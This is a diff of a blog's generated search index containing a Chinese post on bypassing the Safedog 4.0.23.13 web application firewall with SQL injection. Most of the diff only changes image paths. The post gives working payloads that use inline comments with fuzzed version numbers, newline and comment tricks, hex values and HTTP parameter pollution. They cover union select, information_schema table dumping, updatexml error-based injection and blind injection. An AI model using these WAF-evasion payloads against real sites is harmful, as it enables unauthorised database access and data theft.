@@ -2145,91 +2145,93 @@
   <entry>
     <title>安全狗4.0 sqli绕过</title>
     <url>/posts/d405928/</url>
-    <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="1.png"></p>
-<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="2.png"></p>
-<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="3.png"><br>无法绕过</p>
-<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="4.png"></p>
-<p><img src="8.png"><br>可以绕过<br><br/></p>
+    <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/.com//1.png"></p>
+
+
+<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/.com//2.png"></p>
+<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/.com//3.png"><br>无法绕过</p>
+<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/.com//4.png"></p>
+<p><img src="/.com//8.png"><br>可以绕过<br><br></p>
 <h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
 <p>可以使用十六进制绕过</p>
-<br/>
+<br>
 ##### http参数污染
 ![](14.png)
-<br/>
+<br>
 
 <hr>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
-<p><img src="6.png"><br><img src="7.png"></p>
+<p><img src="/.com//6.png"><br><img src="/.com//7.png"></p>
 <h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
-<br/>
+<br>
 
 <hr>
 <h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
 <p>fuzz跑了下10000-99999都无法绕过</p>
-<p><img src="5.png"></p>
-<br/>
+<p><img src="/.com//5.png"></p>
+<br>
 
-<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="9.png"></p>
+<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/.com//9.png"></p>
 <p>无法绕过</p>
-<br/>
+<br>
 
-<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="10.png"></p>
+<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/.com//10.png"></p>
 <p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
 <p>fuzz一下，发现91625以后的都可以绕过</p>
-<p><img src="11.png"></p>
-<p><img src="12.png"></p>
+<p><img src="/.com//11.png"></p>
+<p><img src="/.com//12.png"></p>
 <h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
 <p><img src="http3.png"></p>
 <p><img src="http4.png"></p>
-<br/>
+<br>
 
 <hr>
 <h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
-<br/>
+<br>
 
 <p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
-<p><img src="13.png"></p>
-<br/>
+<p><img src="/.com//13.png"></p>
+<br>
 
 <hr>
 <h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
 <h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
 <p><img src="http5.png"></p>
-<br/>
+<br>
 
 <hr>
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
 <p>无waf情况下</p>
-<p><img src="baocuo1.pmg"></p>
+<p><img src="/.com//baocuo1.pmg"></p>
 <p>开启安全狗</p>
-<p><img src="baocuo2.png"></p>
+<p><img src="/.com//baocuo2.png"></p>
 <p>updataxml()会被拦截，中间加内联注释可以绕过</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
-<p><img src="baocuo3.png"></p>
+<p><img src="/.com//baocuo3.png"></p>
 <p>但是</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
 <p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
 <p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
-<p><img src="baocuo4.png"></p>
-<br/>
+<p><img src="/.com//baocuo4.png"></p>
+<br>
 
 <h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
 <p><img src="http6.png"></p>
 <p><img src="http7.png"></p>
-<br/>
+<br>
 
 <hr>
 <h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
-<p><img src="bool1.png"> </p>
-<p><img src="bool2.png"></p>
-<br/>
+<p><img src="/.com//bool1.png"> </p>
+<p><img src="/.com//bool2.png"></p>
+<br>
 
-<br/>
+<br>
 
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
 <p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
